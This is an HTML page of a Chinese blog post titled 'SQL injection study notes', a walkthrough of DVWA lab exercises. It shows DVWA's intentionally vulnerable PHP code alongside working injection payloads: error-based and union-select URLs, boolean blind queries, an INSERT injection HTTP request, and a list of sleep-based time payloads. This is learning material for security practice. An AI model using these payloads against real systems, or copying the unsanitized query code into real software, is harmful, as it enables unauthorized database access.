<!DOCTYPE html>
<html>

<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<meta name="theme-color" content="#33474d">
	<title>sql注入学习笔记 | guimaizi&#39;s blog</title>
	<link rel="stylesheet" href="/css/style.css" />
	
      <link rel="alternate" href="/atom.xml" title="guimaizi&#39;s blog" type="application/atom+xml">
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body>

	<header class="header">
		<nav class="header__nav">
			
				<a href="/archives" class="header__link">Archive</a>
			
				<a href="/tags" class="header__link">Tags</a>
			
				<a href="/atom.xml" class="header__link">RSS</a>
			
		</nav>
		<h1 class="header__title"><a href="/">guimaizi&#39;s blog</a></h1>
		<h2 class="header__subtitle">道心不改,灵台无尘。</h2>
	</header>

	<main>
		<article>
	
		<h1>sql注入学习笔记</h1>
	
	<div class="article__infos">
		<span class="article__date">2019-02-02</span><br />
		
			<span class="article__category">
				<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81/">安全/代码</a>
			</span><br />
		
		
	</div>

	

	
		<h1 id="sql注入学习"><a href="#sql注入学习" class="headerlink" title="sql注入学习"></a>sql注入学习</h1><p>mysql数据库名:dvwa<br>database(),user()</p>
<h3 id="mysql报错注入"><a href="#mysql报错注入" class="headerlink" title="mysql报错注入"></a>mysql报错注入</h3><pre><code>&lt;?php

if( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) {
    // Get input
    $id = $_REQUEST[ &apos;id&apos; ];

    // Check database
    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;;
    $result = mysql_query( $query ) or die( &apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );

    // Get results
    $num = mysql_numrows( $result );
    $i   = 0;
    while( $i &lt; $num ) {
        // Get values
        $first = mysql_result( $result, $i, &quot;first_name&quot; );
        $last  = mysql_result( $result, $i, &quot;last_name&quot; );

        // Feedback for end user
        echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;

        // Increase loop count
        $i++;
    }

    mysql_close();
}

?&gt; </code></pre><p>判断是否为sql:<br>正常url:<a href="http://guimaizivul.qq.com/vulnerabilities/sqli/?id=a&amp;Submit=Submit#" target="_blank" rel="noopener">http://guimaizivul.qq.com/vulnerabilities/sqli/?id=a&amp;Submit=Submit#</a><br>单引号判断:<a href="http://guimaizivul.qq.com/vulnerabilities/sqli/?id=a%27&amp;Submit=Submit#" target="_blank" rel="noopener">http://guimaizivul.qq.com/vulnerabilities/sqli/?id=a%27&amp;Submit=Submit#</a> 页面异常<br><figure class="figure"><img src="https://s1.ax1x.com/2018/10/21/iByRDx.png" alt="iByRDx.png"><figcaption class="figure__caption">iByRDx.png</figcaption></figure> or 1=1– <a href="http://guimaizivul.qq.com/vulnerabilities/sqli/?id=a%27or%201=1--%20&amp;Submit=Submit#" target="_blank" rel="noopener">http://guimaizivul.qq.com/vulnerabilities/sqli/?id=a%27or%201=1--%20&amp;Submit=Submit#</a></p>
<blockquote>
<p>$query = “SELECT first_name, last_name FROM users WHERE user_id = ‘$id’ or 1=1’–;”; 遍历出first_name, last_name字段所有数据<br>判断表内共有列数<br><a href="http://guimaizivul.qq.com/vulnerabilities/sqli/?id=a&#39;order" target="_blank" rel="noopener">http://guimaizivul.qq.com/vulnerabilities/sqli/?id=a&#39;order</a> by 2– &amp;Submit=Submit#<br>出数据库用户名<br><a href="http://guimaizivul.qq.com/vulnerabilities/sqli/?id=a%27union%20select%201,user()--%20&amp;Submit=Submit#" target="_blank" rel="noopener">http://guimaizivul.qq.com/vulnerabilities/sqli/?id=a%27union%20select%201,user()--%20&amp;Submit=Submit#</a><br>$query = “SELECT first_name, last_name FROM users WHERE user_id = ‘$id’ union select 1,user()–;’”;</p>
</blockquote>
<h2 id=""><a href="#" class="headerlink" title=""></a><figure class="figure"><img src="https://s1.ax1x.com/2018/10/21/iBy2K1.png" alt="iBy2K1.png"><figcaption class="figure__caption">iBy2K1.png</figcaption></figure></h2><h3 id="mysql盲注"><a href="#mysql盲注" class="headerlink" title="mysql盲注"></a>mysql盲注</h3><pre><code>&lt;?php

if( isset( $_GET[ &apos;Submit&apos; ] ) ) {
    // Get input
    $id = $_GET[ &apos;id&apos; ];

    // Check database
    $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;;
    $result = mysql_query( $getid ); // Removed &apos;or die&apos; to suppress mysql errors

    // Get results
    $num = @mysql_numrows( $result ); // The &apos;@&apos; character suppresses errors
    if( $num &gt; 0 ) {
        // Feedback for end user
        echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;
    }
    else {
        // User wasn&apos;t found, so the page wasn&apos;t!
        header( $_SERVER[ &apos;SERVER_PROTOCOL&apos; ] . &apos; 404 Not Found&apos; );

        // Feedback for end user
        echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;
    }

    mysql_close();
}

?&gt; </code></pre><p>数据库名长度: <a href="http://guimaizivul.qq.com/vulnerabilities/sqli_blind/" target="_blank" rel="noopener">http://guimaizivul.qq.com/vulnerabilities/sqli_blind/</a> ?id=a’ or length((select database()))&gt;=3 – &amp;Submit=Submit#<br>判读数据库名:<a href="http://guimaizivul.qq.com/vulnerabilities/sqli_blind/" target="_blank" rel="noopener">http://guimaizivul.qq.com/vulnerabilities/sqli_blind/</a> ?id=a’ or ascii(mid(database(),2,1))&gt;76 – &amp;Submit=Submit#<br><a href="http://guimaizivul.qq.com/vulnerabilities/sqli_blind/" target="_blank" rel="noopener">http://guimaizivul.qq.com/vulnerabilities/sqli_blind/</a> ?id=a’ or ascii(mid(database(),1,1))=1– &amp;Submit=Submit#</p>
<h2 id="-1"><a href="#-1" class="headerlink" title=""></a><figure class="figure"><img src="https://s1.ax1x.com/2018/10/21/iBXVj1.png" alt="iBXVj1.png"><figcaption class="figure__caption">iBXVj1.png</figcaption></figure></h2><h3 id="mysql-INSERT注入"><a href="#mysql-INSERT注入" class="headerlink" title="mysql INSERT注入"></a>mysql INSERT注入</h3><pre><code>&lt;?php

if( isset( $_POST[ &apos;btnSign&apos; ] ) ) {
    // Get input
    $message = trim( $_POST[ &apos;mtxMessage&apos; ] );
    $name    = trim( $_POST[ &apos;txtName&apos; ] );
    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
    /*
    // Sanitize name input
    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
    */
    // Update database
    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;;
    echo $query .&quot;&lt;hr&gt;&quot;;
    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );

    //mysql_close();
}

?&gt;


POST /DVWA/vulnerabilities/xss_s/ HTTP/1.1
Host: 192.168.0.107
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.0.107/DVWA/vulnerabilities/xss_s/
Content-Type: application/x-www-form-urlencoded
Content-Length: 87
Cookie: security=low; PHPSESSID=jmokhe5ce35gqiq2qvbtt516j2
Connection: close
Upgrade-Insecure-Requests: 1

txtName=1&apos; |(select hex(database())));#&amp;mtxMessage=get_datan_ame&amp;btnSign=Sign+Guestbook</code></pre><p><figure class="figure"><img src="https://s1.ax1x.com/2018/10/22/iDKBiF.png" alt="iDKBiF.png"><figcaption class="figure__caption">iDKBiF.png</figcaption></figure> <figure class="figure"><img src="https://s1.ax1x.com/2018/10/22/iDKDG4.png" alt="iDKDG4.png"><figcaption class="figure__caption">iDKDG4.png</figcaption></figure> txtName参数处注入 hex解码6476761 为数据库名dvwa</p>
<p>payload: * 1’|(select hex(database()))) * 1’| sleep(6))# * or sleep(6)# * and sleep(5)# * ‘ AND SLEEP(5) AND ‘DzvZ’=’DzvZ * ‘%2Bsleep(5)%2B’12 * %2bsleep(5)</p>
<hr>
<p>参考资料:<br><a href="http://ascii.911cha.com/" target="_blank" rel="noopener">ASCII码对照表</a><br><a href="https://www.cnblogs.com/xishaonian/p/6103505.html" target="_blank" rel="noopener">Sqli-LABS通关笔录-5[SQL布尔型盲注]</a><br><a href="http://www.freebuf.com/column/184285.html" target="_blank" rel="noopener">新手渗透测试训练营——SQL注入</a><br><a href="http://blackwolfsec.cc/2018/07/30/sql_update_insert/" target="_blank" rel="noopener">Insert和Update型SQL注入的实践之旅</a></p>

	

	
		<span class="different-posts"><a href="/2019/02/02/sql-e6-b3-a8-e5-85-a5-e5-ad-a6-e4-b9-a0-e7-ac-94-e8-ae-b0/" onclick="window.history.go(-1); return false;">⬅️ Go back </a></span>

	

</article>

	</main>

	<footer class="footer">
	<div class="footer-content">
		
	      <div class="footer__element">
	<p>Hi there, <br />welcome to my Blog glad you found it. Have a look around, will you?</p>
</div>

	    
	      <div class="footer__element">
	<h5>Check out</h5>
	<ul class="footer-links">
		<li class="footer-links__link"><a href="/archives">Archive</a></li>
		
		  <li class="footer-links__link"><a href="/atom.xml">RSS</a></li>
	    
		<li class="footer-links__link"><a href="/about">about page</a></li>
		<li class="footer-links__link"><a href="/tags">Tags</a></li>
		<li class="footer-links__link"><a href="/categories">Categories</a></li>
	</ul>
</div>

	    

		<div class="footer-credit">
			<span>© 2020 guimaizi | Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> | Theme <a href="https://github.com/HoverBaum/meilidu-hexo" target="_blank" rel="noopener">MeiliDu</a></span>
		</div>

	</div>


</footer>



</body>

</html>
